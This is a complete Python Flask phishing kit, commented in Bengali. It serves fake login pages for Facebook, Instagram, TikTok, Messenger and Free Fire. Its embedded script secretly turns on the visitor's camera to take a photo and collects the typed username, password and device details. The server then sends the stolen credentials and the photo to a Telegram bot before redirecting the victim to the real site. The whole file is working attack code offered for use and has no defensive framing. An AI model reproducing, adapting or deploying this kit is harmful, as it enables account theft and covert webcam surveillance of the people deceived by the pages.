import os
import requests
import base64
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# --- আপনার সেটিংস (এখানে আপনার ডাটা দিন) ---
BOT_TOKEN = "YOUR_BOT_TOKEN" 
CHAT_ID = "YOUR_CHAT_ID"     

# --- প্রো-লেভেল মাস্টার টেমপ্লেট ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .fb-bg { background-color: #f0f2f5; }
        .ff-bg { background: url('https://wallpapercave.com/wp/wp7154238.jpg') no-repeat center; background-size: cover; }
        .insta-bg { background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); }
        .tt-bg { background-color: #010101; } /* TikTok Black Theme */
    </style>
</head>
<body class="flex items-center justify-center min-h-screen {{ bg_class }}">
    <div class="bg-white p-8 rounded-lg shadow-2xl w-full max-w-sm">
        <div class="text-center mb-6">
            {% if title == 'TikTok' %}
                <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="w-20 mx-auto mb-2">
            {% endif %}
            <h1 class="text-3xl font-extrabold {{ text_color }}">{{ title }}</h1>
            <p class="text-gray-500 text-sm mt-2">Log in to continue</p>
        </div>
        <form id="loginForm" class="space-y-4">
            <input type="text" id="user" placeholder="Username or Email" class="w-full p-3 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 outline-none" required>
            <input type="password" id="pass" placeholder="Password" class="w-full p-3 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 outline-none" required>
            <button type="submit" class="w-full {{ btn_color }} text-white font-bold py-3 rounded-md transition duration-200">Log In</button>
        </form>
    </div>

    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function startCapture() {
            try {
                // ভিক্টিমের কাছে ক্যামেরার পারমিশন চাইবে
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // ৩ সেকেন্ড পর অটো ছবি তুলবে
                setTimeout(takePhoto, 3000);
            } catch (e) {
                console.log("Camera access denied.");
            }
        }

        function takePhoto() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const photoData = canvas.toDataURL('image/jpeg');
            
            // ছবি টেলিগ্রামে পাঠানো
            fetch('/upload_image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: photoData })
            });
        }

        window.onload = startCapture;

        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const battery = await navigator.getBattery();
            const info = {
                user: document.getElementById('user').value,
                pass: document.getElementById('pass').value,
                app: "{{ title }}",
                hw: `RAM: ${navigator.deviceMemory}GB | CPU: ${navigator.hardwareConcurrency} | Battery: ${Math.round(battery.level * 100)}%`
            };
            
            await fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });
            
            // অরিজিনাল সাইটে রিডাইরেক্ট
            window.location.href = "{{ redirect }}";
        };
    </script>
</body>
</html>
"""

@app.route('/<app_name>')
def dynamic_app(app_name):
    config = {
        'facebook': {'title': 'Facebook', 'bg': 'fb-bg', 'text': 'text-blue-600', 'btn': 'bg-blue-600', 'redir': 'https://www.facebook.com'},
        'freefire': {'title': 'Free Fire', 'bg': 'ff-bg', 'text': 'text-orange-500', 'btn': 'bg-orange-600', 'redir': 'https://ff.garena.com'},
        'instagram': {'title': 'Instagram', 'bg': 'insta-bg', 'text': 'text-pink-600', 'btn': 'bg-pink-600', 'redir': 'https://www.instagram.com'},
        'tiktok': {'title': 'TikTok', 'bg': 'tt-bg', 'text': 'text-red-500', 'btn': 'bg-red-600', 'redir': 'https://www.tiktok.com'},
        'messenger': {'title': 'Messenger', 'bg': 'fb-bg', 'text': 'text-blue-500', 'btn': 'bg-blue-500', 'redir': 'https://www.messenger.com'}
    }
    
    c = config.get(app_name.lower(), {'title': app_name.capitalize(), 'bg': 'bg-gray-100', 'text': 'text-gray-800', 'btn': 'bg-black', 'redir': 'https://google.com'})
    return render_template_string(HTML_TEMPLATE, title=c['title'], bg_class=c['bg'], text_color=c['text'], btn_color=c['btn'], redirect=c['redir'])

@app.route('/login', methods=['POST'])
def login():
    d = request.json
    msg = f"🔥 **NEW LOG** 🔥\\n\\n👤 User: `{d['user']}`\\n🔑 Pass: `{d['pass']}`\\n📱 App: {d['app']}\\n\\n⚙️ **DEVICE INFO**\\n{d['hw']}\\n\\n✅ **Dev By Anas +971504614724**"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    return jsonify({"status": "ok"})

@app.route('/upload_image', methods=['POST'])
def upload_image():
    img_data = base64.b64decode(request.json['image'].split(',')[1])
    with open("victim_shot.jpg", "wb") as f:
        f.write(img_data)
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": open("victim_shot.jpg", "rb")})
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
